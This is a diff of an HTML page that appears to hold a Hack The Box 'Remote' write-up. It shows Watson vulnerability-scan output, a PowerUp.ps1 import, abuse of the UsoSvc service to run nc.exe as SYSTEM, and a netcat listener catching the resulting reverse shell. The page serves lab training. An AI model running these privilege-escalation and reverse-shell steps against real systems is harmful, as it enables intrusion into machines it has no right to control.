-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
     OS Build Number: 17763
        [!] CVE-2019-0836 : VULNERABLE
         [&gt;] https://exploit-db.com/exploits/46718
@@ -459,62 +278,17 @@ Microsoft Windows [Version 10.0.17763.107]
 us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
 
     Finished. Found 9 potential vulnerabilities.
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/images/htb/remote/2.gif" alt=""></p>
+</code></pre></div><p><img src="/images/htb/remote/2.gif" alt=""></p>
 <p>I looked at all of them and then, as I wasn’t familiar with Windows, I had no idea what to do next. There were some mentions in these about some services being vulnerable. Luckly I found this PowerUp.ps1 powershell script which can escalate privileges as noted below.</p>
 <blockquote>
 <p>PowerUp is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system.</p>
 </blockquote>
 <p>So I transfered it to the server, entered powershell and imported the script:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; Import-Module c:\windows\temp\PowerUp.ps1
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; Import-Module c:\windows\temp\PowerUp.ps1
 Import-Module c:\windows\temp\PowerUp.ps1
 PS C:\windows\temp&gt;
-</code></pre></td></tr></table>
-</div>
-</div><p>So this script/service exploit allows us to run a command as nt authority/system so I just started another nc listener on my machine and executed nc.exe on this box with elevated privileges.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; sc.exe stop UsoSvc
+</code></pre></div><p>So this script/service exploit allows us to run a command as nt authority/system so I just started another nc listener on my machine and executed nc.exe on this box with elevated privileges.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; sc.exe stop UsoSvc
 sc.exe stop UsoSvc
 [SC] ControlService FAILED 1062:
 
@@ -544,26 +318,8 @@ sc.exe start UsoSvc
 The service did not respond to the start or control request in a timely fashion.
 
 PS C:\windows\temp&gt;
-</code></pre></td></tr></table>
-</div>
-</div><p>and on my reverse shell listener:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 4444
+</code></pre></div><p>and on my reverse shell listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 4444
 [sudo] password for kali: 
 listening on [any] 4444 ...
 connect to [10.10.14.243] from (UNKNOWN) [10.10.10.180] 49781
@@ -575,9 +331,7 @@ whoami
 nt authority\system
 
 C:\Windows\system32&gt;
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+</code></pre></div><hr>
 <h1 id="lessons-learned">Lessons learned</h1>
 <p>(Some of this might be n00b knowledge but this was my first Windows box)</p>
 <ul>
@@ -587,51 +341,64 @@ C:\Windows\system32&gt;
 </ul>
 
 
-		</div>
 
-		<div class="post-tags">
-			
-				
-					<nav class="nav tags">
-							<ul class="flat">
-								
-								<li><a href="/tags/ftp">FTP</a></li>
-								
-								<li><a href="/tags/powerup.ps1">PowerUp.ps1</a></li>
-								
-								<li><a href="/tags/rpc">RPC</a></li>
-								
-								<li><a href="/tags/umbraco">Umbraco</a></li>
-								
-							</ul>
-					</nav>
-				
-			
-		</div>
-		</div>
-	<div class="footer wrapper">
-	<nav class="nav">
-		<div> © All rights reserved | <a href="https://ajdin.io/privacy/">Privacy</a> | 
-                <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
-	</nav>
+<div class="post-tags">
+    
+    <a class="post-tag" href="https://ajdin.io/tags/ftp/">ftp</a>
+    <a class="post-tag" href="https://ajdin.io/tags/powerup.ps1/">powerup.ps1</a>
+    <a class="post-tag" href="https://ajdin.io/tags/rpc/">rpc</a>
+    <a class="post-tag" href="https://ajdin.io/tags/umbraco/">umbraco</a></div>
+
+
+
+
+
+<div class="social-icons">
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="Twitter"
+         href="https://twitter.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="twitter"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="GitHub"
+         href="https://github.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="github"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="RSS"
+         href="/index.xml"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="rss"></i>
+
+      </a>
+    
+     
 </div>
 
 
 
-<script>feather.replace()</script>
-<script src="cookieconsent.js"></script>
+            </div><footer id="footer">
+    <p>  © 2020</p>
+</footer>
+<script src="https://unpkg.com/feather-icons"></script>
 <script>
-    new CookiesEuBanner(function () {
-        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-        
-	ga('set', 'anonymizeIp', true);
-        ga('create', 'UA-165836726-1', 'auto');
-        ga('send', 'pageview');
-    });
+  feather.replace()
 </script>
-</body>
+</div>
+    </body>
 </html>
